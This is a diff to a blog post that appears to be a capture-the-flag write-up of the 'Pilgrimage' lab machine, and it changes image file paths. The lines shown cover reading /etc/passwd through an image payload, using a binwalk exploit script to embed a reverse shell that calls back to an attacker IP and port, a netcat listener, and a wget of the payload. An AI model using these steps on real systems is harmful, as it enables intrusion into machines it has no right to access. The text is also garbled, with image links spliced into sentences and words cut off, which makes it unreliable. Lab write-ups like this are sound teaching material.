@@ -65,7 +65,7 @@ This command will increase the payload by reading the file `/etc/passwd` on the 
 
 ![](/assets/img/posts/pasted-image-20260![](assets/img/posts/pasted-image-20260819224454-png) is payload added to the actual image or not: <https://github.com/exiftool/exiftool>
 ```
-exiftool /assets/img/posts/image-png.svg
+exiftool /assets/img/posts/image-.png
 ```
 
 ![](assets/img/posts/20250816233349-png)
@@ -75,7 +75,7 @@ After we get the image with Payload, go back to the first website page. That we 
 
 ![](/assets/img/posts/pasted-image-20260819224701-![](assets/img/posts/pasted-image-20260819224701-png)oaded. to analyze the file by this command:
 ```
-identify -verbose /assets/img/posts/6sd1f4dfdf-png.svg
+identify -verbose /assets/img/posts/6sd1f4dfdf-.png
 ```
 
 ![](assets/img/posts/20250816233412-png)
@@ -170,25 +170,25 @@ After further searching on google, it was found that `binwalk` version 2.3.2 hav
 
 So we will add a reverse shell payload to the image, by putting the image in the folder of the exploit
 ```
-python3 51249.py /assets/img/posts/binwalk-exploit-png.svg 10.10.16.4 4321
+python3 51249.py /assets/img/posts/binwalk-exploit-.png 10.10.16.4 4321
 ```
-It will generate the image: /assets/img/posts/binwalk-exploit-png.svg
+It will generate the image: /assets/img/posts/binwalk-exploit-.png
 
-![](/assets/img/posts/pasted-image-20260819230522-png.svg)
+![](/assets/img/posts/pasted-image-20260819230522-.png)
 
 Then we upload the image file to the folder `/var/www/pilgrimage.htb/shrunk` which is the folder whe![](assets/img/posts/pasted-image-20260819230522-png)r from our kali
 ```
 nc -lnvp 4321
 ```
 
-Second, from another terminal from our kali, make a web server where the /assets/img/posts/binwalk-exploit-png.svg is there
+Second, from another terminal from our kali, make a web server where the /assets/img/posts/binwalk-exploit-.png is there
 ```
 python3 -m http.server 5555
 ```
 
 Third, from the HTM machine, download the image
 ```
-wget 10.10.16.4:5555//assets/img/posts/binwalk-exploit-png.svg
+wget 10.10.16.4:5555//assets/img/posts/binwalk-exploit-.png
 ```
 
 Back to our listener, and we got a shell
